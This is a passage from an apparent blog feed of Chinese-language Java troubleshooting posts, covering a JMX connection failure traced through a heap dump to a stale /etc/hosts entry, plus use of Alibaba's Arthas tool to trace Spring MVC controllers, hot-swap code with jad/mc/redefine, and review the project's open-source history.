class="keyword">return</span> findRMIServerIIOP(path.substring(<span class="number">5</span>,end), environment, isIiop);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> String msg = <span class="string">"URL path must begin with /jndi/ or /stub/ "</span> +</span><br><span class="line">                    <span class="string">"or /ior/: "</span> + path;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> RMIServer <span class="title">findRMIServerJRMP</span><span class="params">(String base64, Map&lt;String, ?&gt; env, <span class="keyword">boolean</span> isIiop)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// could forbid "iiop:" URL here -- but do we need to?</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] serialized;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            serialized = base64ToByteArray(base64);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">"Bad BASE64 encoding: "</span> +</span><br><span class="line">                    e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> ByteArrayInputStream bin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ClassLoader loader = EnvHelp.resolveClientClassLoader(env);</span><br><span class="line">        <span class="keyword">final</span> ObjectInputStream oin =</span><br><span class="line">                (loader == <span class="keyword">null</span>) ?</span><br><span class="line">                    <span class="keyword">new</span> ObjectInputStream(bin) :</span><br><span class="line">                    <span class="keyword">new</span> ObjectInputStreamWithLoader(bin, loader);</span><br><span class="line">        <span class="keyword">final</span> Object stub;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stub = oin.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">"Class not found: "</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (RMIServer)stub;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>通过代码处理，发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rO0ABXN9AAAAAQAlamF2YXgubWFuYWdlbWVudC5yZW1vdGUucm1pLlJNSVNlcnZlcnhyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyAC1qYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN0SW52b2NhdGlvbkhhbmRsZXIAAAAAAAAAAgIAAHhyABxqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN002G0kQxhMx4DAAB4cHc4AAtVbmljYXN0UmVmMgAADTExLjE2NC4yMzUuMTEAAIfoCEScYyGQodFlwEdFAAABawK/zE6AAQB4</span><br></pre></td></tr></table></figure>
<p>转换为了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RMIServerImpl_Stub[UnicastRef2 [liveRef: [endpoint:[11.164.235.11:26449](remote),objID:[-5ddae53d:16b0887d710:-7fff, 7209064096623493021]]]]</span><br></pre></td></tr></table></figure>
<p><strong>可见RMI Server的IP的确是<code>11.164.235.11</code>。</strong></p>
<p>那么现在问题变成了：</p>
<ul>
<li>为什么JVM动态加载了<code>management-agent</code>，得到的JMX URL是指向外部IP的？</li>
</ul>
<h3 id="通过heap-dump定位IP字符串"><a href="#通过heap-dump定位IP字符串" class="headerlink" title="通过heap dump定位IP字符串"></a>通过heap dump定位IP字符串</h3><p>但是调试<code>management-agent</code>的加载过程可能会比较痛苦，于是考虑从别的地方入手。</p>
<p>从上面的调查里，发现<code>management-agent</code>启动之后，<code>11.164.235.11</code>这个外部IP就会出现在JVM内存里，那么考虑用heap dump的方式来定位。</p>
<p>通过执行heap dump，再用<code>jvisualvm</code>来分析。</p>
<p>用OQL来搜索所有包含<code>11.164.235.11</code>的String：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> s <span class="keyword">from</span> java.lang.String s <span class="keyword">where</span> s.toString().equals(<span class="string">"11.164.235.11"</span>)</span><br></pre></td></tr></table></figure>
<p>可以发现有好几个结果：</p>
<p><img src="https://user-images.githubusercontent.com/1683936/58687979-bde91880-83b5-11e9-88f8-ee498e22337f.png" alt></p>
<p>再依次点开，查看引用，<strong>发现其中一个引用的字段名是<code>localHost</code></strong>：</p>
<p><img src="https://user-images.githubusercontent.com/1683936/58688109-1c15fb80-83b6-11e9-8afb-cfbedfd0f036.jpg" alt></p>
<p><strong>因此可以猜测：是不是localHost域名解析有问题？</strong></p>
<h3 id="定位localHost域名解析问题"><a href="#定位localHost域名解析问题" class="headerlink" title="定位localHost域名解析问题"></a>定位localHost域名解析问题</h3><p>执行hostname命令，得到机器名，再ping一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$hostname</span><br><span class="line">web-app201641.we42</span><br><span class="line"></span><br><span class="line">$ping web-app201641.we42</span><br><span class="line">PING web-app201641.we42 (11.164.235.11) 56(84) bytes of data.</span><br></pre></td></tr></table></figure>
<p>发现本机被解析到<code>11.164.235.11</code>了，但是本机的IP是<code>11.164.234.171</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 11.164.234.171  netmask 255.255.255.0  broadcast 11.164.234.255</span><br></pre></td></tr></table></figure>
<p>到这里，大概猜到原因了，检查下 <code>/etc/hosts</code>文件，果然发现有配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11.164.235.11  web-app201641.we42</span><br></pre></td></tr></table></figure>
<p>把这个错误的host配置去掉之后，再执行jmx连接终于成功了。</p>
<p>为什么会有错误的hosts配置呢？据说是机器迁移时遗留的。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>动态JMX连接的工作原理：</p>
<ol>
<li>让目标<code>VirtualMachine</code>动态加载<code>management-agent</code></li>
<li>从Agent Properties里获取到JMX连接地址：<code>com.sun.management.jmxremote.localConnectorAddress</code></li>
<li>JMX URL里带<code>stub</code>的字符串，实际上是base64转换为byte[]，再用<code>ObjectInputStream</code>转换为<code>RMIServer</code></li>
<li>JMX实际上是通过RMI来连接的</li>
</ol>
<p>排查问题的关键：</p>
<ol>
<li>定位错误连接的IP</li>
<li>heap dump</li>
<li>用OQL从heap dump里查找IP字符串，再查看相关的引用来获取信息</li>
</ol>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul>
<li><a href="https://visualvm.github.io/" target="_blank" rel="noopener">ViauslVM</a></li>
<li><a href="http://cr.openjdk.java.net/~sundar/8022483/webrev.01/raw_files/new/src/share/classes/com/sun/tools/hat/resources/oqlhelp.html" target="_blank" rel="noopener">Object Query Language (OQL)</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
        <tag>visualvm</tag>
        <tag>jmx</tag>
      </tags>
  </entry>
  <entry>
    <title>Arthas实践：是哪个Controller处理了请求？</title>
    <url>/arthas-springmvc-controller/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Arthas是阿里巴巴开源的Java诊断利器，深受开发者喜爱。</p>
<ul>
<li><a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li><a href="https://alibaba.github.io/arthas/arthas-tutorials?language=cn" target="_blank" rel="noopener">Arthas在线教程</a></li>
</ul>
<p>之前分享了Arthas怎样排查 404/401 的问题: <a href="http://hengyunabc.github.io/arthas-spring-boot-404-401/">http://hengyunabc.github.io/arthas-spring-boot-404-401/</a></p>
<p>我们可以快速定位一个请求是被哪些<code>Filter</code>拦截的，或者请求最终是由哪些<code>Servlet</code>处理的。</p>
<p>但有时，我们想知道一个请求是被哪个Spring MVC Controller处理的。如果翻代码的话，会比较难找，并且不一定准确。</p>
<p>通过Arthas可以精确定位是哪个<code>Controller</code>处理请求。</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>还是以这个demo为例： <a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-404-401" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-404-401</a></p>
<p>启动之后，访问： <a href="http://localhost:8080/user/1" target="_blank" rel="noopener">http://localhost:8080/user/1</a> ，会返回一个user对象。那么这个请求是被哪个<code>Controller</code>处理的呢？</p>
<h2 id="trace定位DispatcherServlet"><a href="#trace定位DispatcherServlet" class="headerlink" title="trace定位DispatcherServlet"></a>trace定位DispatcherServlet</h2><p>我们先试下跟踪<code>Servlet</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trace javax.servlet.Servlet *</span><br></pre></td></tr></table></figure>
<p>从trace的结果可以看出来，请求最终是被<code>DispatcherServlet#doDispatch()</code>处理了，但是没有办法知道是哪个<code>Controller</code>处理。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`---[27.453122ms] org.springframework.web.servlet.DispatcherServlet:doDispatch()</span><br><span class="line">    +---[0.005822ms] org.springframework.web.context.request.async.WebAsyncUtils:getAsyncManager() #929</span><br><span class="line">    +---[0.107365ms] org.springframework.web.servlet.DispatcherServlet:checkMultipart() #936</span><br><span class="line">    |   `---[0.062451ms] org.springframework.web.servlet.DispatcherServlet:checkMultipart()</span><br><span class="line">    |       `---[0.016924ms] org.springframework.web.multipart.MultipartResolver:isMultipart() #1093</span><br><span class="line">    +---[2.103935ms] org.springframework.web.servlet.DispatcherServlet:getHandler() #940</span><br><span class="line">    |   `---[2.036042ms] org.springframework.web.servlet.DispatcherServlet:getHandler()</span><br></pre></td></tr></table></figure>
<h2 id="watch定位handler"><a href="#watch定位handler" class="headerlink" title="watch定位handler"></a>watch定位handler</h2><p>trace结果里把调用的行号打印出来了，我们可以直接在IDE里查看代码（也可以用jad命令反编译）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// org.springframework.web.servlet.DispatcherServlet</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		HttpServletRequest processedRequest = request;</span><br><span class="line">		HandlerExecutionChain mappedHandler = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">boolean</span> multipartRequestParsed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">		WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			ModelAndView mv = <span class="keyword">null</span>;</span><br><span class="line">			Exception dispatchException = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				processedRequest = checkMultipart(request);</span><br><span class="line">				multipartRequestParsed = (processedRequest != request);</span><br><span class="line"></span><br><span class="line">				<span class="comment">// Determine handler for the current request.</span></span><br><span class="line">				mappedHandler = getHandler(processedRequest);</span><br><span class="line">				<span class="keyword">if</span> (mappedHandler == <span class="keyword">null</span> || mappedHandler.getHandler() == <span class="keyword">null</span>) &#123;</span><br><span class="line">					noHandlerFound(processedRequest, response);</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>仔细看代码，可以发现<code>mappedHandler = getHandler(processedRequest);</code>得到了处理请求的handler</li>
</ul>
<p>下面用<code>watch</code>命令来获取<code>getHandler</code>函数的返回结果。</p>
<p><code>watch</code>之后，再次访问 <a href="http://localhost:8080/user/1" target="_blank" rel="noopener">http://localhost:8080/user/1</a> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ watch org.springframework.web.servlet.DispatcherServlet getHandler returnObj</span><br><span class="line">Press Q or Ctrl+C to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost <span class="keyword">in</span> 332 ms.</span><br><span class="line">ts=2019-06-04 11:38:06; [cost=2.75218ms] result=@HandlerExecutionChain[</span><br><span class="line">    logger=@SLF4JLocationAwareLog[org.apache.commons.logging.impl.SLF4JLocationAwareLog@665c08a],</span><br><span class="line">    handler=@HandlerMethod[public com.example.demo.arthas.user.User com.example.demo.arthas.user.UserController.findUserById(java.lang.Integer)],</span><br><span class="line">    interceptors=null,</span><br><span class="line">    interceptorList=@ArrayList[isEmpty=<span class="literal">false</span>;size=2],</span><br><span class="line">    interceptorIndex=@Integer[-1],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>可以看到处理请求的handler是 <code>com.example.demo.arthas.user.UserController.findUserById</code>。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>Spring MVC的请求是在<code>DispatcherServlet</code>分发，查找到对应的<code>mappedHandler</code>来处理</li>
<li>使用Arthas时，灵活结合代码，可以快速精确定位问题</li>
</ul>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul>
<li><a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li><a href="https://alibaba.github.io/arthas/watch.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/watch.html</a></li>
<li><a href="https://alibaba.github.io/arthas/trace.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/trace.html</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>spring</tag>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title>Arthas Github Star破万啦，回顾开源历程，展望未来</title>
    <url>/arthas-star-10000/</url>
    <content><![CDATA[<h2 id="一、Arthas的历史"><a href="#一、Arthas的历史" class="headerlink" title="一、Arthas的历史"></a>一、Arthas的历史</h2><p><img src="https://alibaba.github.io/arthas/_images/arthas.png" alt="Arthas"></p>
<ul>
<li><a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
</ul>
<p><code>Arthas</code>在阿里巴巴内部起源于2015年，当时微服务方兴未艾，我们团队一方面专注Spring Boot落地，提高开发效率，另外一方面，希望可以提高线上排查问题的能力和效率。当时我们经过选型讨论，选择基于<code>Greys</code>来开发，提供更好的应用诊断体验。</p>
<p>我们在用户体验上做了大量的改进：彩色UI，Web Console，内网一键诊断等。下面是内网一键在线诊断的截图，很多同事线上诊断问题的必备工具：</p>
<p><img src="https://user-images.githubusercontent.com/1683936/53077314-b0a5cd80-352c-11e9-99c7-25e5561c0ec0.png" alt="image"></p>
<h2 id="二、Arthas开源之后的工作"><a href="#二、Arthas开源之后的工作" class="headerlink" title="二、Arthas开源之后的工作"></a>二、Arthas开源之后的工作</h2><p>尽管<code>Arthas</code>在阿里内部广受好评，但它只是内部工具，很多离职同事都在一些文章里提到。做为Java开发的一员，我们使用到了很多开源的代码和工具，我们也希望可以提升广大开发人员的诊断效率，因此在2018年9月底，我们正式开源了Arthas。</p>
<p>在开源之后，<code>Arthas</code>多次登顶Github Trending，还被<code>@Java</code>官方twitter转发：</p>
<p><img src="https://user-images.githubusercontent.com/1683936/53077222-7fc59880-352c-11e9-837f-14948ac7c948.png" alt="image"></p>
<p>在开源之后，<code>Arthas</code>发布了3个release版本，做了大量的改进：</p>
<ul>
<li>全新的LOGO</li>
<li>arthas-boot统一跨平台体验</li>
<li>Arthas在线教程</li>
<li>全新版本的Web Console</li>
<li>全新的中英文档，感谢社区的大力支持</li>
<li>JDK11全面支持，lamda类支持</li>
<li>Docker支持</li>
<li>灵活的ognl命令</li>
<li>增加内存编译器，实现jad/mc/redefine一条龙</li>
<li>Q键退出，history匹配，快捷键支持</li>
<li>不断完善的自动补全支持</li>
<li>重构重定向的支持</li>
</ul>
<p>目前，<code>Arthas</code> Github star数10000+，月下载量7000+。在开源中国2018开源软件排行榜里，<code>Arthas</code>获得国产新秀榜第一名。</p>
<p>这是对我们过去工作的支持和肯定，也是我们持续改进<code>Arthas</code>的动力。</p>
<p><img src="https://user-images.githubusercontent.com/1683936/53077846-edbe8f80-352d-11e9-8764-6c97a0fc91ff.png" alt="Arthas Github"></p>
<h2 id="三、感谢贡献者们"><a href="#三、感谢贡献者们" class="headerlink" title="三、感谢贡献者们"></a>三、感谢贡献者们</h2><p><code>Arthas</code>在开源以来，不断收获到国内外贡献者的支持，目前已有40+贡献者，非常感谢他们的工作：</p>
<p><img src="https://opencollective.com/arthas/contributors.svg?width=890&amp;button=false" alt="Arthas贡献者"></p>
<p>特别感谢<code>@Hearen</code>贡献了大部分的英文翻译，<code>@wetsion</code>重构了新版本的Web Console。</p>
<p>参与贡献： <a href="https://github.com/alibaba/arthas/blob/master/CONTRIBUTING.md" target="_blank" rel="noopener">https://github.com/alibaba/arthas/blob/master/CONTRIBUTING.md</a></p>
<h2 id="四、Arthas实践系列文章"><a href="#四、Arthas实践系列文章" class="headerlink" title="四、Arthas实践系列文章"></a>四、Arthas实践系列文章</h2><p>做为Arthas的用户，我们在实践中积累了很多经验，总结为一系列的文章，希望对大家线上排查问题有帮助：</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/fsHhkwfE-vrQRkQvUL1JGA" target="_blank" rel="noopener">Arthas实践–jad/mc/redefine线上热更新一条龙</a></li>
<li><a href="https://mp.weixin.qq.com/s/PlCwMhEFdtgHZTNBaNVIRQ" target="_blank" rel="noopener">Alibaba Arthas实践–获取到Spring Context，然后为所欲为</a></li>
<li><a href="https://mp.weixin.qq.com/s/RQmYur3m2AsXFiuLwUCDnw" target="_blank" rel="noopener">Arthas实践–快速排查Spring Boot应用404/401问题</a></li>
<li><a href="https://mp.weixin.qq.com/s/-jhSV86_2E7WYhXbtVpAGQ" target="_blank" rel="noopener">当Dubbo遇上Arthas：排查问题的实践</a></li>
<li><a href="https://mp.weixin.qq.com/s/boGS0VK45mZ_zT25K44S5Q" target="_blank" rel="noopener">使用Arthas抽丝剥茧排查线上应用日志打满问题</a></li>
<li><a href="https://mp.weixin.qq.com/s/eCIDxM9lXYX0cM7LGgfn1w" target="_blank" rel="noopener">深入Spring Boot：利用Arthas排查NoSuchMethodError</a></li>
</ul>
<h2 id="五、Arthas-4-0规划"><a href="#五、Arthas-4-0规划" class="headerlink" title="五、Arthas 4.0规划"></a>五、Arthas 4.0规划</h2><ul>
<li>提供一个新的字节码框架，名为<code>bytekit</code></li>
<li>插件化支持</li>
<li>view分层，支持Web白屏化</li>
</ul>
<p>详细链接： <a href="https://github.com/alibaba/arthas/issues/536" target="_blank" rel="noopener">https://github.com/alibaba/arthas/issues/536</a> ，同时希望大家可以提出建议和参与。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>Arthas实践--jad/mc/redefine线上热更新一条龙</title>
    <url>/arthas-online-hotswap/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>尽管在生产环境热更新代码，并不是很好的行为，很可能导致：热更不规范，同事两行泪。</p>
<p>但很多时候我们的确希望能热更新代码，比如：</p>
<blockquote>
<p>线上排查问题，找到修复思路了，但应用重启之后，环境现场就变了，难以复现。怎么验证修复方案？</p>
</blockquote>
<p>又比如：</p>
<blockquote>
<p>本地开发时，发现某个开源组件有bug，希望修改验证。如果是自己编译开源组件再发布，流程非常的长，还不一定能编译成功。有没有办法快速测试？</p>
</blockquote>
<p>Arthas是阿里巴巴开源的Java应用诊断利器，深受开发者喜爱。</p>
<p>下面介绍利用Arthas 3.1.0版本的 <code>jad</code>/<code>mc</code>/<code>redefine</code> 一条龙来热更新代码。</p>
<ul>
<li>Arthas: <a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li>jad命令：<a href="https://alibaba.github.io/arthas/jad.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/jad.html</a></li>
<li>mc命令：<a href="https://alibaba.github.io/arthas/mc.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/mc.html</a></li>
<li>redefine命令：<a href="https://alibaba.github.io/arthas/redefine.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/redefine.html</a></li>
</ul>
<h2 id="Arthas在线教程"><a href="#Arthas在线教程" class="headerlink" title="Arthas在线教程"></a>Arthas在线教程</h2><p>下面通过Arthas在线教程演示热更新代码的过程。</p>
<ul>
<li><a href="https://alibaba.github.io/arthas/arthas-tutorials?language=cn&amp;id=arthas-advanced" target="_blank" rel="noopener">Arthas进阶教程</a></li>
</ul>
<p><img src="/img/arthas-online-hotswap.png" alt="arthas-online-hotswap"></p>
<p>在例子里，访问 <code>curl http://localhost/user/0</code>，会返回500错误：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"timestamp"</span>: <span class="number">1550223186170</span>,</span><br><span class="line">    <span class="string">"status"</span>: <span class="number">500</span>,</span><br><span class="line">    <span class="string">"error"</span>: <span class="string">"Internal Server Error"</span>,</span><br><span class="line">    <span class="string">"exception"</span>: <span class="string">"java.lang.IllegalArgumentException"</span>,</span><br><span class="line">    <span class="string">"message"</span>: <span class="string">"id &lt; 1"</span>,</span><br><span class="line">    <span class="string">"path"</span>: <span class="string">"/user/0"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面通过热更新代码，修改这个逻辑。</p>
<h2 id="jad反编译代码"><a href="#jad反编译代码" class="headerlink" title="jad反编译代码"></a>jad反编译代码</h2><p>反编译<code>UserController</code>，保存到 <code>/tmp/UserController.java</code>文件里。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jad --<span class="built_in">source</span>-only com.example.demo.arthas.user.UserController &gt; /tmp/UserController.java</span><br></pre></td></tr></table></figure>
<h2 id="修改反编译出来的代码"><a href="#修改反编译出来的代码" class="headerlink" title="修改反编译出来的代码"></a>修改反编译出来的代码</h2><p>用文本编辑器修改<code>/tmp/UserController.java</code>，把抛出异常改为正常返回：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(value=&#123;<span class="string">"/user/&#123;id&#125;"</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(@PathVariable Integer id)</span> </span>&#123;</span><br><span class="line">    logger.info(<span class="string">"id: &#123;&#125;"</span>, (Object)id);</span><br><span class="line">    <span class="keyword">if</span> (id != <span class="keyword">null</span> &amp;&amp; id &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(id, <span class="string">"name"</span> + id);</span><br><span class="line">        <span class="comment">// throw new IllegalArgumentException("id &lt; 1");</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> User(id.intValue(), <span class="string">"name"</span> + id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sc查找加载UserController的ClassLoader"><a href="#sc查找加载UserController的ClassLoader" class="headerlink" title="sc查找加载UserController的ClassLoader"></a>sc查找加载UserController的ClassLoader</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sc -d *UserController | grep classLoaderHash</span><br><span class="line"> classLoaderHash   1be6f5c3</span><br></pre></td></tr></table></figure>
<p>可以发现是spring boot的 <code>LaunchedURLClassLoader@1be6f5c3</code> 加载的。</p>
<h2 id="mc内存编译代码"><a href="#mc内存编译代码" class="headerlink" title="mc内存编译代码"></a>mc内存编译代码</h2><p>保存好<code>/tmp/UserController.java</code>之后，使用mc(Memory Compiler)命令来编译，并且通过<code>-c</code>参数指定<code>ClassLoader</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mc -c 1be6f5c3 /tmp/UserController.java -d /tmp</span><br><span class="line">Memory compiler output:</span><br><span class="line">/tmp/com/example/demo/arthas/user/UserController.class</span><br><span class="line">Affect(row-cnt:1) cost <span class="keyword">in</span> 346 ms</span><br></pre></td></tr></table></figure>
<h2 id="redefine热更新代码"><a href="#redefine热更新代码" class="headerlink" title="redefine热更新代码"></a>redefine热更新代码</h2><p>再使用redefine命令重新加载新编译好的<code>UserController.class</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ redefine /tmp/com/example/demo/arthas/user/UserController.class</span><br><span class="line">redefine success, size: 1</span><br></pre></td></tr></table></figure>
<h2 id="检验热更新结果"><a href="#检验热更新结果" class="headerlink" title="检验热更新结果"></a>检验热更新结果</h2><p>再次访问 <code>curl http://localhost/user/0</code>，会正常返回：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"id"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"name0"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Arthas里 <code>jad</code>/<code>mc</code>/<code>redefine</code> 一条龙来线上热更新代码，非常强大，但也很危险，需要做好权限管理。</p>
<p>比如，线上应用启动帐号是 admin，当用户可以切换到admin，那么</p>
<ul>
<li>用户可以修改，获取到应用的任意内存值（不管是否java应用）</li>
<li>用户可以attach jvm</li>
<li>attach jvm之后，利用jvm本身的api可以redefine class</li>
</ul>
<p>所以：</p>
<ul>
<li>应用的安全主要靠用户权限本身的管理</li>
<li>Arthas主要是让jvm redefine更容易了。用户也可以利用其它工具达到同样的效果</li>
</ul>
<p>最后，Arthas提醒您： <strong>诊断千万条，规范第一条，热更不规范，同事两行泪</strong>。</p>
<h2 id="Arthas实践系列"><a href="#Arthas实践系列" class="headerlink" title="Arthas实践系列"></a>Arthas实践系列</h2><ul>
<li><a href="/arthas-spring-context/">Alibaba Arthas实践–获取到Spring Context，然后为所欲为</a></li>
<li><a href="/arthas-spring-boot-404-401/">Arthas实践–快速排查Spring Boot应用404/401问题</a></li>
<li><a href="/dubbo-meet-arthas/">当Dubbo遇上Arthas：排查问题的实践</a></li>
<li><a href="/arthas-redefine-case/">Arthas实践–使用redefine排查应用奇怪的日志来源</a></li>
<li><a href="/arthas-logger-problem/">使用Arthas抽丝剥茧排查线上应用日志打满问题</a></li>
<li><a href="/spring-boot-arthas-NoSuchMethodError/">深入Spring Boot：利用Arthas排查NoSuchMethodError</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>redefine</tag>
        <tag>compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>Alibaba Arthas 3.1.0版本：在线教程、内存编译器和强大的自动补全</title>
    <url>/arthas-3.1.0/</url>
    <content><![CDATA[<p><img src="https://alibaba.github.io/arthas/_images/arthas.png" alt="Arthas"></p>
<p><code>Arthas</code>是Alibaba开源的Java诊断工具，深受开发者喜爱。<br>从Arthas上个版本发布，已经过去两个多月了，Arthas 3.1.0版本不仅带来大家投票出来的新LOGO，还带来强大的新功能和更好的易用性，下面一一介绍。</p>
<ul>
<li>Github： <a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li>文档：<a href="https://alibaba.github.io/arthas" target="_blank" rel="noopener">https://alibaba.github.io/arthas</a></li>
</ul>
<h3 id="在线教程"><a href="#在线教程" class="headerlink" title="在线教程"></a>在线教程</h3><p>在新版本Arthas里，增加了在线教程，用户可以在线运行Demo，一步步学习Arthas的各种用法，推荐新手尝试：</p>
<ul>
<li><a href="https://alibaba.github.io/arthas/arthas-tutorials?language=cn&amp;id=arthas-basics" target="_blank" rel="noopener">Arthas基础教程</a></li>
<li><a href="https://alibaba.github.io/arthas/arthas-tutorials?language=cn&amp;id=arthas-advanced" target="_blank" rel="noopener">Arthas进阶教程</a></li>
</ul>
<p>非常欢迎大家来完善这些教程。</p>
<h3 id="增加内存编译器支持，在线编辑热更新代码"><a href="#增加内存编译器支持，在线编辑热更新代码" class="headerlink" title="增加内存编译器支持，在线编辑热更新代码"></a>增加内存编译器支持，在线编辑热更新代码</h3><p><code>3.1.0</code>版本里新增命令<code>mc</code>，不是方块游戏mc，而是Memory Compiler。</p>
<p>在之前版本里，增加了<code>redefine</code>命令，可以热更新字节码。但是有个不方便的地方：需要把<code>.class</code>文件上传到服务器上。</p>
<p>在<code>3.1.0</code>版本里，结合<code>jad</code>/<code>mc</code>/<code>redefine</code> 可以完美实现热更新代码。</p>
<p>以 <a href="https://alibaba.github.io/arthas/arthas-tutorials?language=cn&amp;id=arthas-advanced" target="_blank" rel="noopener">Arthas在线教程</a> 里的<code>UserController</code>为例：</p>
<ol>
<li><p>使用jad反编译代码</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jad --<span class="built_in">source</span>-only com.example.demo.arthas.user.UserController &gt; /tmp/UserController.java</span><br></pre></td></tr></table></figure>
</li>
